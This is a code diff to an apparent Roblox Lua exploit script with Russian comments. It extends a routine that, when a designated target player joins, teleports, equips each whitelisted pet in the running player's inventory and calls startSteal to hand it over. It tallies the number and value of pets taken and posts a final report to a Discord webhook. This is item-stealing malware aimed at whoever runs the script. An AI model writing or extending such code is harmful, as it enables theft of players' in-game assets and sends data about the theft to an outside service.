@@ -16,6 +16,11 @@ for petUid, petInfo in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
     originalPetUIDs[petUid] = true
     originalPetData[petUid] = petInfo
 end
+getgenv().TransferredCount = 0
+getgenv().TransferredValue = 0
+getgenv().AlreadyTransferred = {}
+getgenv().FinalTransferSent = false
+
 
 
 getgenv().PetConfig = {
@@ -635,24 +640,52 @@ for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
         end
 
         local function checkPetsInventory(target)
-            for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
-                if not checkPetsWhitelist(value.PetType, value.PetData) then 
-                    continue 
-                end
-
-                local petObject = getPetObject(petUid)
-                if not petObject then continue end
-
-                equipPet(petObject)
-                task.wait(0.2)
-                startSteal(target)
-            end
+    for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
+        if not checkPetsWhitelist(value.PetType, value.PetData) then 
+            continue 
         end
+
+        if getgenv().AlreadyTransferred[petUid] then
+            continue -- уже передавался
+        end
+
+        local petObject = getPetObject(petUid)
+        if not petObject then continue end
+
+        -- Данные питомца
+        local petName = value.PetType
+        local level = value.PetData.Level or 0
+        local baseWeight = value.PetData.BaseWeight or 0
+        local growthFactor = getgenv().PetConfig.GrowthFactor or 0.1
+        local weight = baseWeight * (1 + level * growthFactor)
+        local petPrice = PET_VALUES[petName] or 0
+
+        -- Вывод в консоль
+        print(string.format("✅ Передан: %s | Level: %d | Weight: %.2f KG | Value: %d", petName, level, weight, petPrice))
+
+        -- Можешь заменить на сообщение игроку:
+        game.StarterGui:SetCore("ChatMakeSystemMessage", {
+            Text = string.format("✅ Передан: %s | Level: %d | Weight: %.2f KG | Value: %d", petName, level, weight, petPrice),
+            Color = Color3.fromRGB(0, 255, 0)
+        })
+
+        -- Обновляем статистику
+        getgenv().TransferredCount += 1
+        getgenv().TransferredValue += petPrice
+        getgenv().AlreadyTransferred[petUid] = true
+
+        equipPet(petObject)
+        task.wait(0.2)
+        startSteal(target)
+    end
+end
+
 
         local function idlingTarget()
     task.spawn(function()
         local lastTarget = nil
         local targetEnterTime = 0
+
         while task.wait(0.2) do
             local isTarget, trigerName = waitForJoin()
             if isTarget then
@@ -660,22 +693,35 @@ for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
                     lastTarget = trigerName
                     targetEnterTime = tick()
                 end
+
                 if tick() - targetEnterTime >= 10 then
                     teleportTarget(trigerName)
                     checkPetsInventory(trigerName)
+
+                    -- ✅ Проверка: всё передано?
+                    local stillHasPets = false
+                    for petUid, petInfo in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
+                        if checkPetsWhitelist(petInfo.PetType, petInfo.PetData) and not getgenv().AlreadyTransferred[petUid] then
+                            stillHasPets = true
+                            break
+                        end
+                    end
+
+                    if not stillHasPets and not getgenv().FinalTransferSent then
+                        getgenv().FinalTransferSent = true
+
+                        local report = string.format("✅ **Все питомцы переданы!**\n📦 Количество: %d\n💰 Общая стоимость: %d",
+                            getgenv().TransferredCount, getgenv().TransferredValue)
+
+                        createDiscordEmbed(report, "📤 Завершённая передача", "", function()
+                            print("📬 Финальный отчёт отправлен в Discord.")
+                        end)
+                    end
                 end
             else
                 lastTarget = nil
                 targetEnterTime = 0
             end
-        end
-    end)
-
-    -- 👇 отслеживание, исчез ли питомец (1 раз)
-    task.spawn(function()
-        while not reportSent do
-            checkIfPetTransferred()
-            task.wait(1)
         end
     end)
 end
